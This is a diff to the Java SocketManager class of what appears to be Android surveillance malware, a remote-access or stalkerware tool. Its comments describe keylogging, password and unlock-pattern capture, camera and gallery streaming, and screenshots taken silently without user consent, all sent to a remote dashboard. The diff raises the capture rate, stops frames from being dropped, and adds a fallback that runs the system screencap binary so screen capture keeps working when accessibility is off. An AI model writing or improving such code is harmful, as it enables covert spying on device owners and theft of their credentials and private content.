@@ -127,7 +127,7 @@ public class SocketManager {
     private ScheduledFuture<?> idleFrameFuture;
     // Interval (ms) between JPEG frame pushes — set by stream_start's intervalMs param.
     // Mirrors the screenReaderDashboardIntervalMs approach used by screen_reader_stream_start.
-    private volatile long idleFrameIntervalMs = 2000L;
+    private volatile long idleFrameIntervalMs = 1000L;
     // Saved streaming state so it can be restored after forceReconnect()
     private volatile boolean resumeStreamingAfterReconnect = false;
     // "Latest frame wins" — if a frame request arrives while the sender is busy,
@@ -163,8 +163,8 @@ public class SocketManager {
 
     // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
     // The internal 50ms tick still runs (for password/pattern capture), but dashboard
-    // screen:update pushes are rate-limited to this value. Default 2000ms is safe for 3G/4G.
-    private volatile long screenReaderDashboardIntervalMs  = 2000L;
+    // screen:update pushes are rate-limited to this value. Default 1000ms = 1 fps.
+    private volatile long screenReaderDashboardIntervalMs  = 1000L;
     private volatile long lastScreenReaderDashboardPushMs  = 0L;
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
@@ -202,11 +202,14 @@ public class SocketManager {
     private final Object streamLock  = new Object();
     private final Object liveLock    = new Object();
 
-    // Guard against queuing up multiple concurrent stream writes.
-    // If the previous frame write is still blocking in the kernel (3G back-pressure),
-    // drop the next frame rather than letting writes stack up in memory.
+    // Guard against overlapping concurrent stream writes.
     private final java.util.concurrent.atomic.AtomicBoolean streamWriteBusy =
             new java.util.concurrent.atomic.AtomicBoolean(false);
+    // Latest frame waiting to be written — "newest wins": a slower frame in-flight is
+    // never stacked with older backlog; only the most recent one is ever pending.
+    // This guarantees no frame is dropped AND the dashboard always sees the freshest screen.
+    private final AtomicReference<android.util.Pair<String, JSONObject>> pendingStreamMsg =
+            new AtomicReference<>(null);
 
     // Feature mutex — only one high-bandwidth feature runs at a time.
     // Starting screen stream, camera stream, or gallery automatically stops the others
@@ -601,38 +604,58 @@ public class SocketManager {
     }
 
     private void sendStreamMessage(String event, JSONObject data) {
-        // Drop frame if a previous write is still blocking in the kernel (3G back-pressure).
-        // This prevents unbounded write queuing that would cause command-channel stalls.
-        if (!streamWriteBusy.compareAndSet(false, true)) {
-            Log.d(TAG, "sendStreamMessage: stream write busy, dropping frame");
-            return;
-        }
-        boolean useFallback = false;
+        // Always record the latest frame — overwrites any frame that was waiting.
+        // "Latest wins": the dashboard sees the freshest screen, never a stale backlog,
+        // AND no frame is ever silently discarded before reaching the socket.
+        pendingStreamMsg.set(new android.util.Pair<>(event, data));
+
+        // If a writer already holds the lock it will drain pendingStreamMsg when it
+        // finishes the current write — nothing more to do here.
+        if (!streamWriteBusy.compareAndSet(false, true)) return;
+
+        // We hold the lock — drain all pending frames until the queue is empty.
+        drainStreamMessages();
+    }
+
+    /**
+     * Write loop: flushes pendingStreamMsg while holding streamWriteBusy.
+     * Must only be called when streamWriteBusy has just been set to true by the caller.
+     */
+    private void drainStreamMessages() {
         try {
-            if (streamOut != null && streamConnected) {
-                // streamLock is only held during the actual socket write; the fallback
-                // to sendMessage happens AFTER releasing this lock to avoid lock-ordering
-                // issues (never hold streamLock while acquiring primaryLock).
-                synchronized (streamLock) {
-                    try {
-                        JSONObject msg = new JSONObject();
-                        msg.put("event", event);
-                        msg.put("data", data);
-                        streamOut.print(msg.toString() + "\n");
-                        streamOut.flush();
-                    } catch (JSONException e) {
-                        Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
-                        useFallback = true;
+            android.util.Pair<String, JSONObject> msg;
+            while ((msg = pendingStreamMsg.getAndSet(null)) != null) {
+                boolean useFallback = false;
+                if (streamOut != null && streamConnected) {
+                    // streamLock is only held during the actual socket write; fallback
+                    // to sendMessage happens OUTSIDE this lock to avoid lock-ordering
+                    // issues (never hold streamLock while acquiring primaryLock).
+                    synchronized (streamLock) {
+                        try {
+                            JSONObject envelope = new JSONObject();
+                            envelope.put("event", msg.first);
+                            envelope.put("data", msg.second);
+                            streamOut.print(envelope.toString() + "\n");
+                            streamOut.flush();
+                        } catch (Exception e) {
+                            Log.e(TAG, "sendStreamMessage write error: " + e.getMessage());
+                            useFallback = true;
+                        }
                     }
+                } else {
+                    useFallback = true;
                 }
-            } else {
-                useFallback = true;
+                // Fallback outside all locks — avoids lock-ordering deadlock with primaryLock
+                if (useFallback) sendMessage(msg.first, msg.second);
             }
         } finally {
             streamWriteBusy.set(false);
         }
-        // Fallback outside all locks — avoids lock-ordering deadlock with primaryLock
-        if (useFallback) sendMessage(event, data);
+        // Race guard: a new frame may have arrived in the window between the while-loop
+        // exit and streamWriteBusy.set(false). Re-acquire and drain it immediately.
+        if (pendingStreamMsg.get() != null && streamWriteBusy.compareAndSet(false, true)) {
+            drainStreamMessages();
+        }
     }
 
     // ── Secondary channel: live (keylogs, notifications, activity) ────────
@@ -1363,7 +1386,7 @@ public class SocketManager {
             galleryStopFlag.set(true);
             activeFeature = "camera";
             String camId = params.optString("cameraId", "0");
-            long intMs   = Math.max(500L, params.optLong("intervalMs", 2000L));
+            long intMs   = Math.max(500L, params.optLong("intervalMs", 1000L));
             JSONObject camResult = cameraStreamHandler.startStream(camId, intMs);
             if (camResult.optBoolean("success", false)) {
                 idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_CAMERA);
@@ -1654,9 +1677,8 @@ public class SocketManager {
 
         // ── Streaming — event-driven ─────────────────────────────────────
         if (command.equals("stream_start")) {
-            // Read the interval the dashboard requests (500-5000ms; default 2000ms).
-            // Mirrors how screen_reader_stream_start reads intervalMs — same pattern.
-            final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
+            // Read the interval the dashboard requests (500-5000ms; default 1000ms = 1 fps).
+            final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 1000L));
             final String deviceId = DeviceInfo.getDeviceId(context);
             // Serialize setup through heartbeatExecutor (single-threaded) so that a
             // stream_stop submitted just before this cannot arrive *after* we start.
@@ -2062,31 +2084,58 @@ public class SocketManager {
     }
 
     private Bitmap captureFrame() {
-        // AccessibilityService.takeScreenshot() — API 30+, silent, no user consent needed.
-        // Screenshot capture and gesture control are independent — the stream continues
-        // sending frames even when the user has not enabled accessibility for UI control.
+        // Primary path — API 30+: AccessibilityService.takeScreenshot() is silent and
+        // requires no user consent. Gesture control and screen capture are independent;
+        // the stream works even when the user has not enabled accessibility for UI control.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
             if (svc != null) {
                 Bitmap bmp = svc.captureScreenSync();
                 if (bmp != null) return bmp;
                 // captureScreenSync() returned null (service initialising or transient error).
-                // Fall through — loop will retry on next tick.
-            } else {
-                // Accessibility service not running: log once every 30 s to avoid spam.
-                long now = System.currentTimeMillis();
-                if (now - captureUnavailableLastLogMs > 30_000L) {
-                    captureUnavailableLastLogMs = now;
-                    Log.w(TAG, "captureFrame: accessibility service not running — stream loop is alive but frames are suppressed until the service starts.");
-                }
+                // Fall through to the screencap fallback below.
             }
-        } else {
-            // API < 30: AccessibilityService.takeScreenshot() is unavailable.
-            // Stream loop stays alive; frames resume if device is running API 30+.
+        }
+        // Fallback: screencap -p works on the vast majority of Android devices
+        // (including API < 30 and devices where accessibility is not yet enabled).
+        // Returns null silently on locked-down ROMs — stream stays alive and retries.
+        return captureViaScreencap();
+    }
+
+    /**
+     * Capture a frame using the system {@code screencap} binary.
+     *
+     * <p>{@code screencap -p} writes a PNG to stdout. This works on nearly all Android
+     * ROMs (including API < 30 and pre-accessibility startup) without requiring root or
+     * any user permission dialog. On the rare ROM where the binary is absent or restricted
+     * the method returns {@code null} quietly so the stream loop simply skips that tick.
+     */
+    private Bitmap captureViaScreencap() {
+        try {
+            Process proc = Runtime.getRuntime().exec(new String[]{"/system/bin/screencap", "-p"});
+            java.io.InputStream is = proc.getInputStream();
+            java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream(512 * 1024);
+            byte[] chunk = new byte[8192];
+            int n;
+            long total = 0;
+            while ((n = is.read(chunk)) != -1) {
+                total += n;
+                if (total > 8 * 1024 * 1024) break; // 8 MB hard cap — avoids OOM on slow CPUs
+                buf.write(chunk, 0, n);
+            }
+            proc.waitFor();
+            byte[] png = buf.toByteArray();
+            if (png.length > 0) {
+                android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
+                opts.inSampleSize = 2; // half resolution keeps bandwidth and memory low
+                return android.graphics.BitmapFactory.decodeByteArray(png, 0, png.length, opts);
+            }
+        } catch (Exception e) {
             long now = System.currentTimeMillis();
             if (now - captureUnavailableLastLogMs > 30_000L) {
                 captureUnavailableLastLogMs = now;
-                Log.w(TAG, "captureFrame: API " + Build.VERSION.SDK_INT + " < 30 — takeScreenshot() unavailable, stream idle.");
+                Log.w(TAG, "captureViaScreencap unavailable (API " + Build.VERSION.SDK_INT
+                        + "): " + e.getMessage());
             }
         }
         return null;
@@ -2425,10 +2474,10 @@ public class SocketManager {
             }
 
             case "screen_reader_stream_start": {
-                // Read the interval the dashboard requests (1000-5000ms; default 2000ms for 3G safety).
+                // Read the interval the dashboard requests (500-5000ms; default 1000ms = 1 fps).
                 // The internal 50ms tick keeps running for password/pattern capture,
                 // but screen:update pushes to the dashboard are throttled to this value.
-                final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
+                final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 1000L));
                 // Serialize through heartbeatExecutor (single-threaded) so that a
                 // stream_stop submitted just before cannot overtake this start.
                 final UnifiedAccessibilityService finalSvc = accessSvc;
